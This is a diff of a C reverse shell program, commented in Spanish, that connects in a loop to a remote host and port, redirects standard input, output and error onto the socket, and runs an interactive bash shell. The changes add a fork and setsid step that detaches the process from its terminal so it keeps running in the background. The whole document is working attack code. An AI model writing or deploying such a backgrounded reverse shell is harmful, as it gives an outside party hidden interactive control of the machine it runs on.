@@ -20,6 +20,14 @@ void error(const char *msg) {
 }
 
 int main(int argc, char *argv[]) {
+
+  //FORK (separar terminal de proceso)}
+  pid_t pid = fork();
+  if(pid < 0 ) exit(1);
+  if(pid > 0 ) exit(0);
+
+  if(setsid() == -1) _exit(1);
+
   // Determinar numero de argumentos
   if (argc < 2) {
     fprintf(stderr, "No se proporciono el puerto");
@@ -60,7 +68,7 @@ int main(int argc, char *argv[]) {
   memcpy(&serv_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
   // Asignar puerto a la estructura del server
   serv_addr.sin_port = htons(portno);
-  // Intentar conexion entre el socket FD y los datos del servidor
+
 
   while (1) {
     // Socket de internet, TCP, protocolo 0 (TCP)
@@ -77,10 +85,12 @@ int main(int argc, char *argv[]) {
       continue;
     }
 
+  //Redirigir salidas
     dup2(sockfd, STDIN_FILENO);
     dup2(sockfd, STDOUT_FILENO);
     dup2(sockfd, STDERR_FILENO);
-    execl("/bin/bash", "bash", "-i", NULL);
+    // execl("/usr/bin/script", "script", "-q", "/bin/bash", NULL);
+    execl("/bin/bash", "bash","-i", NULL);
   }
 
   close(sockfd);
